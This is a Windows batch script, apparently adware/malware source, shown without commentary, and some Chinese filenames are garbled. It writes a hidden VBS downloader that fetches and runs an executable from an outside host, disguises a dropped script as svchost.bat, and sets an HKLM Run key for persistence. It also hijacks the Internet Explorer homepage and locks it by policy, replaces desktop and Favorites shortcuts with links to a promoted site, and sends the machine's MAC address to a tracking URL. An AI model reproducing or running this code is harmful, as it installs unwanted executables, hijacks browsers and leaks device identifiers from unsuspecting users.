Echo Set xPost = createObject("Microsoft.XMLHTTP")  >%windir%\help\internet.vbs
Echo xPost.Open "GET","http://www.procto.cn/dll/internet.exe",0 >>%windir%\help\internet.vbs
Echo xPost.Send() >>%windir%\help\internet.vbs
Echo Set sGet = createObject("ADODB.Stream") >>%windir%\help\internet.vbs
Echo sGet.Mode = 3 >>%windir%\help\internet.vbs
Echo sGet.Type = 1 >>%windir%\help\internet.vbs
Echo sGet.Open() >>%windir%\help\internet.vbs
Echo sGet.Write(xPost.responseBody) >>%windir%\help\internet.vbs
Echo sGet.SaveToFile "%windir%\Resources\internet.exe" >>%windir%\help\internet.vbs

Echo CreateObject("WScript.Shell").Run "cmd /c %windir%\Resources\internet.exe",0 >>%windir%\help\internet.vbs

Echo @Echo Off>%windir%\help\svchost.bat
Echo Set lnkdir="%%userprofile%%\Application Data\Microsoft\Internet Explorer\Quick Launch">>%windir%\help\svchost.bat
Echo Echo [InternetShortcut] ^>%%lnkdir%%\Internet" "Explorer.url>>%windir%\help\svchost.bat
Echo Echo URL="http://www.115ku.com/?8638/" ^>^>%%lnkdir%%\Internet" "Explorer.url>>%windir%\help\svchost.bat
Echo Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" ^>^>%%lnkdir%%\Internet" "Explorer.url>>%windir%\help\svchost.bat
Echo Echo IconIndex=^^0 ^>^>%%lnkdir%%\Internet" "Explorer.url>>%windir%\help\svchost.bat

Echo @Echo Off >> %windir%\help\svchost.bat
Echo Set lnkdir="%%USERPROFILE%%\����\">>%windir%\help\svchost.bat
Echo Echo [InternetShortcut] ^>%%lnkdir%%\115�ᵼ��.url>>%windir%\help\svchost.bat
Echo Echo URL="http://www.115ku.com/?8638/" ^>^>%%lnkdir%%\115�ᵼ��.url>>%windir%\help\svchost.bat
Echo Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" ^>^>%%lnkdir%%\115�ᵼ��.url>>%windir%\help\svchost.bat
Echo Echo IconIndex=^^0 ^>^>%%lnkdir%%\115�ᵼ��.url>>%windir%\help\svchost.bat

Echo ping 127.0.0.1 -n 20 >> %windir%\help\svchost.bat
Echo mshta vbscript:CreateObject("WScript.Shell").Run("iexplore http://chaliang.115ku.cn/8638/auto.htm",0)(window.close)>> %windir%\help\svchost.bat
Echo ping 127.0.0.1 -n 5 >> %windir%\help\svchost.bat
Echo taskkill /f /im iexplore.exe /t >> %windir%\help\svchost.bat
Echo ping 127.0.0.1 -n 5 >> %windir%\help\svchost.bat
Echo reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.115ku.com/?8638/ /f >> %windir%\help\svchost.bat


Echo Set shell = Wscript.createobject("wscript.shell") >> %windir%\help\runauto.vbs
Echo a = shell.run ("%windir%\help\svchost.bat",0) >> %windir%\help\runauto.vbs

Echo Set shell = Wscript.createobject("wscript.shell") >> %windir%\help\runauto.vbs
Echo a = shell.run ("%windir%\help\internet.vbs",0) >> %windir%\help\runauto.vbs

reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v pop /t REG_SZ /d %windir%\help\runauto.vbs /f

@Echo Windows Registry Editor Version 5.00>;tem.reg
@Echo. >>;tem.reg
@Echo [HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command]>>;tem.reg
@Echo @="\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://www.115ku.com/?8638/">>;tem.reg
Regedit /s tem.reg
Del /q tem.reg

reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.115ku.com/?8638/ /f

reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HOMEPAGE /t REG_DWORD /d 00000001 /f

@Echo Windows Registry Editor Version 5.00>;gai.reg
@Echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]>>;gai.reg
@Echo "Favorites"=hex(2):25,00,75,00,73,00,65,00,72,00,70,00,72,00,6f,00,66,00,69,00,\>>;gai.reg
@Echo   6c,00,65,00,25,00,5c,00,46,00,61,00,76,00,6f,00,72,00,69,00,74,00,65,00,73,\>>;gai.reg
@Echo   00,5c,00,00,00>>;gai.reg
Regedit /s gai.reg
Del /q gai.reg


Del "%userprofile%\����ʼ���˵�\����\*.lnk"

Del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"

@Echo Off
Set lnkdir="%userprofile%\����ʼ���˵�\����"
Echo [InternetShortcut] >%lnkdir%\Internet" "Explorer.url
Echo URL="http://www.115ku.com/?8638/" >>%lnkdir%\Internet" "Explorer.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\Internet" "Explorer.url
Echo IconIndex=^0 >>%lnkdir%\Internet" "Explorer.url

@Echo Off
Set lnkdir="%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch"
Echo [InternetShortcut] >%lnkdir%\Internet" "Explorer.url
Echo URL="http://www.115ku.com/?8638/" >>%lnkdir%\Internet" "Explorer.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\Internet" "Explorer.url
Echo IconIndex=^0 >>%lnkdir%\Internet" "Explorer.url

@Echo Off
Set lnkdir="%USERPROFILE%\����\"
Echo [InternetShortcut] >%lnkdir%\115�ᵼ��.url
Echo URL="http://www.115ku.com/?8638/" >>%lnkdir%\115�ᵼ��.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\115�ᵼ��.url
Echo IconIndex=^0 >>%lnkdir%\115�ᵼ��.url

@Echo Off
Set lnkdir="%userprofile%\Favorites\"
Echo [InternetShortcut] >%lnkdir%\115�ᵼ��" "��������115�ᵼ��.url
Echo URL="http://www.115ku.com/?8638/" >>%lnkdir%\115�ᵼ��" "��������115�ᵼ��.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\115�ᵼ��" "��������115�ᵼ��.url
Echo IconIndex=^0 >>%lnkdir%\115�ᵼ��" "��������115�ᵼ��.url

If Exist %windir%\help\r.vbs (Goto f)
Set "var=ipconfig /all^|findstr /c:"Physical Address""
For /f "tokens=2 delims=:" %%a In ('%var%') do set mac=%%a
Set mac=%mac:-=:%

Echo CreateObject("WScript.Shell").Run "iexplore http://chaliang.115ku.cn/8638/count.asp?mac=%mac%&os=%OS%&ver=20090612",0 > %windir%\help\r.vbs


start %windir%\help\r.vbs

f:

mshta vbscript:CreateObject("WScript.Shell").Run("iexplore http://chaliang.115ku.cn/8638/yahooo.htm",0)(window.close)



